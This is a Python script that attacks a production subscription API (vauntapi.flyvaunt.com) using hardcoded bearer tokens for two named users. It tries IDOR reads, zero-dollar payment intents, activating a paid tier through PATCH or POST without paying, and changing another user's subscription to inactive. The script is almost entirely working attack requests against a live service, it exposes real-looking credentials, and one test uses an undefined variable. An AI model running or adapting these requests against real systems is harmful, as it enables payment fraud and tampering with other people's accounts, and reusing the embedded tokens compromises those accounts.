#!/usr/bin/env python3
"""
Test REAL subscription endpoints that actually exist in the API
Based on discovered endpoints from other test files
"""

import requests
import json
import time

PROD_URL = "https://vauntapi.flyvaunt.com"

# Working tokens
SAMEER_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoyMDI1NCwiaWF0IjoxNzYyMjMxMTE1LCJleHAiOjE3NjQ4MjMxMTV9.bOz6aK6v9G9B0H2BIXg_N5kWsiBizTbD-v1SlPl3B-Q"
ASHLEY_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoxNzEyMDgsImlhdCI6MTc2MjIyNTUwMSwiZXhwIjoxNzY0ODE3NTAxfQ.TtZeO8zr_3aoLe21AmLGMsLj-ACxXqBh6cKNph_9dYg"

SAMEER_USER_ID = 20254
ASHLEY_USER_ID = 171208

def make_request(method, endpoint, token, data=None, params=None):
    """Make authenticated request"""
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }

    url = f"{PROD_URL}{endpoint}"

    try:
        if method == "GET":
            r = requests.get(url, headers=headers, params=params, timeout=10)
        elif method == "PATCH":
            r = requests.patch(url, headers=headers, json=data, timeout=10)
        elif method == "POST":
            r = requests.post(url, headers=headers, json=data, timeout=10)
        elif method == "PUT":
            r = requests.put(url, headers=headers, json=data, timeout=10)

        result = {
            "status": r.status_code,
            "data": None,
            "raw": r.text[:500]
        }

        if r.text:
            try:
                result["data"] = r.json()
            except:
                result["data"] = r.text[:200]

        return result
    except Exception as e:
        return {"status": "error", "error": str(e), "data": None}

def get_user_status(token):
    """Get current user status"""
    result = make_request("GET", "/v1/user", token)
    if result['status'] == 200 and result['data']:
        return {
            "subscriptionStatus": result['data'].get('subscriptionStatus'),
            "priorityScore": result['data'].get('priorityScore'),
            "stripeCustomerId": result['data'].get('stripeCustomerId'),
            "stripeSubscriptionId": result['data'].get('stripeSubscriptionId')
        }
    return None

print("="*80)
print("TESTING REAL SUBSCRIPTION ENDPOINTS")
print("="*80)

# Get baselines
print("\n📊 BASELINE STATUS:")
ashley_baseline = get_user_status(ASHLEY_TOKEN)
sameer_baseline = get_user_status(SAMEER_TOKEN)

print(f"\nAshley (171208): {ashley_baseline}")
print(f"Sameer (20254): {sameer_baseline}")

vulnerabilities = []

# ============================================================================
# TEST 1: GET /v1/subscription/pk (Stripe public key)
# ============================================================================
print("\n" + "="*80)
print("TEST 1: GET /v1/subscription/pk")
print("="*80)

result = make_request("GET", "/v1/subscription/pk", ASHLEY_TOKEN)
print(f"Status: {result['status']}")
if result['status'] == 200:
    print("✅ Endpoint exists")
    print(f"Response: {json.dumps(result['data'], indent=2)[:300]}")
else:
    print(f"❌ Status: {result['status']}")

# ============================================================================
# TEST 2: GET /v1/subscription (Get user's subscription)
# ============================================================================
print("\n" + "="*80)
print("TEST 2: GET /v1/subscription")
print("="*80)

result = make_request("GET", "/v1/subscription", ASHLEY_TOKEN)
print(f"Status: {result['status']}")
if result['status'] == 200:
    print("✅ Endpoint exists")
    print(f"Response: {json.dumps(result['data'], indent=2)[:300]}")
else:
    print(f"❌ Status: {result['status']}")

# ============================================================================
# TEST 3: GET /v1/subscription?userId=SAMEER (IDOR test)
# ============================================================================
print("\n" + "="*80)
print("TEST 3: IDOR - Ashley accessing Sameer's subscription via userId param")
print("="*80)

result = make_request("GET", "/v1/subscription", ASHLEY_TOKEN, params={"userId": SAMEER_USER_ID})
print(f"Status: {result['status']}")
if result['status'] == 200:
    print("🚨 VULNERABILITY: Ashley can access Sameer's subscription data!")
    print(f"Response: {json.dumps(result['data'], indent=2)[:300]}")
    vulnerabilities.append({
        "name": "IDOR on /v1/subscription",
        "severity": "HIGH",
        "description": "User can access other users' subscription data via userId parameter"
    })
else:
    print(f"✅ Security working - Status: {result['status']}")

# ============================================================================
# TEST 4: POST /v1/subscription/restore
# ============================================================================
print("\n" + "="*80)
print("TEST 4: POST /v1/subscription/restore (Ashley)")
print("="*80)

ashley_before = get_user_status(ASHLEY_TOKEN)
result = make_request("POST", "/v1/subscription/restore", ASHLEY_TOKEN)
print(f"Status: {result['status']}")
if result['status'] == 200:
    print("✅ Request accepted")
    print(f"Response: {json.dumps(result['data'], indent=2)[:300]}")

    time.sleep(1)
    ashley_after = get_user_status(ASHLEY_TOKEN)

    if ashley_before and ashley_after:
        if ashley_after['subscriptionStatus'] != ashley_before['subscriptionStatus']:
            print("🚨 VULNERABILITY: subscriptionStatus changed!")
            print(f"   Before: {ashley_before['subscriptionStatus']}")
            print(f"   After: {ashley_after['subscriptionStatus']}")
            vulnerabilities.append({
                "name": "Subscription restore without validation",
                "severity": "CRITICAL",
                "description": "User can restore subscription without proper validation"
            })
        else:
            print("ℹ️  No subscription status change")
else:
    print(f"Status: {result['status']}")

# ============================================================================
# TEST 5: POST /v1/subscription/paymentIntent with amount 0
# ============================================================================
print("\n" + "="*80)
print("TEST 5: POST /v1/subscription/paymentIntent with amount=0")
print("="*80)

result = make_request("POST", "/v1/subscription/paymentIntent", ASHLEY_TOKEN, {
    "amount": 0,
    "membershipTier": "cabin+"
})
print(f"Status: {result['status']}")
if result['status'] == 200:
    print("⚠️  Request accepted with amount=0")
    print(f"Response: {json.dumps(result['data'], indent=2)[:300]}")

    # Check if subscription changed
    time.sleep(1)
    ashley_after = get_user_status(ASHLEY_TOKEN)
    if ashley_before and ashley_after:
        if ashley_after['subscriptionStatus'] == 3:
            print("🚨 CRITICAL: User got Cabin+ with $0 payment!")
            vulnerabilities.append({
                "name": "Zero-amount payment bypass",
                "severity": "CRITICAL",
                "description": "User can create payment intent with $0 and get subscription"
            })
else:
    print(f"Status: {result['status']}")

# ============================================================================
# TEST 6: POST /v1/subscription/paymentIntent?membershipTier=cabin%2B
# ============================================================================
print("\n" + "="*80)
print("TEST 6: POST /v1/subscription/paymentIntent with membershipTier in query param")
print("="*80)

result = make_request("POST", "/v1/subscription/paymentIntent?membershipTier=cabin%2B",
                      ASHLEY_TOKEN, {"amount": 0, "currency": "USD"})
print(f"Status: {result['status']}")
if result['status'] == 200:
    print("⚠️  Request accepted")
    print(f"Response: {json.dumps(result['data'], indent=2)[:300]}")
else:
    print(f"Status: {result['status']}")

# ============================================================================
# TEST 7: PATCH /v1/subscription with active: true
# ============================================================================
print("\n" + "="*80)
print("TEST 7: PATCH /v1/subscription with active: true")
print("="*80)

ashley_before = get_user_status(ASHLEY_TOKEN)
result = make_request("PATCH", "/v1/subscription", ASHLEY_TOKEN, {
    "active": True,
    "tier": "cabin+"
})
print(f"Status: {result['status']}")
if result['status'] == 200:
    print("✅ Request accepted")
    print(f"Response: {json.dumps(result['data'], indent=2)[:300]}")

    time.sleep(1)
    ashley_after = get_user_status(ASHLEY_TOKEN)

    if ashley_before and ashley_after:
        if ashley_after['subscriptionStatus'] == 3:
            print("🚨 CRITICAL: User activated Cabin+ via PATCH!")
            vulnerabilities.append({
                "name": "Direct subscription activation via PATCH",
                "severity": "CRITICAL",
                "description": "User can activate subscription via PATCH without payment"
            })
else:
    print(f"Status: {result['status']}")

# ============================================================================
# TEST 8: POST /v1/subscription with tier
# ============================================================================
print("\n" + "="*80)
print("TEST 8: POST /v1/subscription with tier: cabin+")
print("="*80)

ashley_before = get_user_status(ASHLEY_TOKEN)
result = make_request("POST", "/v1/subscription", ASHLEY_TOKEN, {
    "tier": "cabin+"
})
print(f"Status: {result['status']}")
if result['status'] == 200:
    print("✅ Request accepted")
    print(f"Response: {json.dumps(result['data'], indent=2)[:300]}")

    time.sleep(1)
    ashley_after = get_user_status(ASHLEY_TOKEN)

    if ashley_before and ashley_after:
        if ashley_after['subscriptionStatus'] == 3:
            print("🚨 CRITICAL: User got Cabin+ via POST!")
            vulnerabilities.append({
                "name": "Direct subscription creation without payment",
                "severity": "CRITICAL",
                "description": "User can create subscription via POST without payment"
            })
else:
    print(f"Status: {result['status']}")

# ============================================================================
# TEST 9: Cross-user subscription manipulation
# ============================================================================
print("\n" + "="*80)
print("TEST 9: Ashley trying to PATCH Sameer's subscription with userId param")
print("="*80)

result = make_request("PATCH", "/v1/subscription", ASHLEY_TOKEN, {
    "userId": SAMEER_USER_ID,
    "active": False,
    "tier": "basic"
})
print(f"Status: {result['status']}")
if result['status'] == 200:
    print("🚨 VULNERABILITY: Can modify other user's subscription!")
    print(f"Response: {json.dumps(result['data'], indent=2)[:300]}")

    # Check if Sameer's subscription was affected
    sameer_after = get_user_status(SAMEER_TOKEN)
    if sameer_before and sameer_after:
        if sameer_after['subscriptionStatus'] != sameer_before['subscriptionStatus']:
            print("🚨🚨🚨 CRITICAL: Ashley modified Sameer's subscription!")
            vulnerabilities.append({
                "name": "Cross-user subscription modification",
                "severity": "CRITICAL",
                "description": "User can modify other users' subscriptions"
            })
else:
    print(f"✅ Security working - Status: {result['status']}")

# ============================================================================
# FINAL STATUS CHECK
# ============================================================================
print("\n" + "="*80)
print("FINAL STATUS CHECK")
print("="*80)

ashley_final = get_user_status(ASHLEY_TOKEN)
sameer_final = get_user_status(SAMEER_TOKEN)

print(f"\nAshley BEFORE: {ashley_baseline}")
print(f"Ashley AFTER:  {ashley_final}")

if ashley_baseline and ashley_final:
    if ashley_final['subscriptionStatus'] != ashley_baseline['subscriptionStatus']:
        print("\n🚨🚨🚨 ASHLEY'S SUBSCRIPTION STATUS CHANGED!")
        print(f"From: {ashley_baseline['subscriptionStatus']} → To: {ashley_final['subscriptionStatus']}")

print(f"\nSameer BEFORE: {sameer_baseline}")
print(f"Sameer AFTER:  {sameer_final}")

if sameer_baseline and sameer_final:
    if sameer_final['subscriptionStatus'] != sameer_baseline['subscriptionStatus']:
        print("\n🚨🚨🚨 SAMEER'S SUBSCRIPTION STATUS CHANGED!")
        print(f"From: {sameer_baseline['subscriptionStatus']} → To: {sameer_final['subscriptionStatus']}")

# ============================================================================
# SUMMARY
# ============================================================================
print("\n" + "="*80)
print("VULNERABILITY SUMMARY")
print("="*80)

if vulnerabilities:
    print(f"\n🚨 FOUND {len(vulnerabilities)} VULNERABILITIES:")
    for i, vuln in enumerate(vulnerabilities, 1):
        print(f"\n{i}. {vuln['name']}")
        print(f"   Severity: {vuln['severity']}")
        print(f"   Description: {vuln['description']}")
else:
    print("\n✅ NO VULNERABILITIES FOUND - All security controls working")

print("\n" + "="*80)
